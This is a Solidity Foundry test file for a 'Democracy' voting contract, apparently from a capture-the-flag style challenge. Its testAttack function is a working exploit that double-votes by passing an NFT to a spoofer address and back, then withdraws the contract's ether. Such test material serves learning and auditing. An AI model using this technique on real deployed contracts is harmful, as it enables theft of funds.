// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/test.sol";
import {Democracy} from "../src/Democracy.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract DemocracyTest is Test {
    Democracy public democracy;

    address challenger = makeAddr("challenger");
    address initialOwner = makeAddr("owner1");
    address spoofer = makeAddr("spoofer");

    function setUp() public {
        vm.prank(initialOwner);
        vm.deal(initialOwner, 1.5 ether);
        democracy = new Democracy{value : 1 ether}();
    }

    function testOwnerIsIncumbent() public {
        assertEq(democracy.incumbent(), democracy.owner());
    }

    function testNominateChallenger() public {
        democracy.nominateChallenger(challenger);
        assertEq(democracy.challenger(), challenger);
        // Check Balance of each address
        assertEq(democracy.balanceOf(challenger), 2); // tokens 0 and 1
        assertEq(democracy.balanceOf(initialOwner), 0);
        // Check votes of each address
        (uint256 challengerVotes) = democracy.votes(challenger);
        assertEq(challengerVotes, 3);
        (uint256 incumbentVotes) = democracy.votes(initialOwner);
        assertEq(incumbentVotes, 5);
    }

    function testAttack() public {
        vm.startPrank(challenger, challenger);
        democracy.nominateChallenger(challenger);
        democracy.transferFrom(challenger, spoofer, 0);
        vm.startPrank(spoofer, spoofer);
        democracy.vote(challenger);
        democracy.transferFrom(spoofer, challenger, 0);
        vm.startPrank(challenger, challenger);
        democracy.vote(challenger);
        democracy.withdrawToAddress(challenger);
    }
}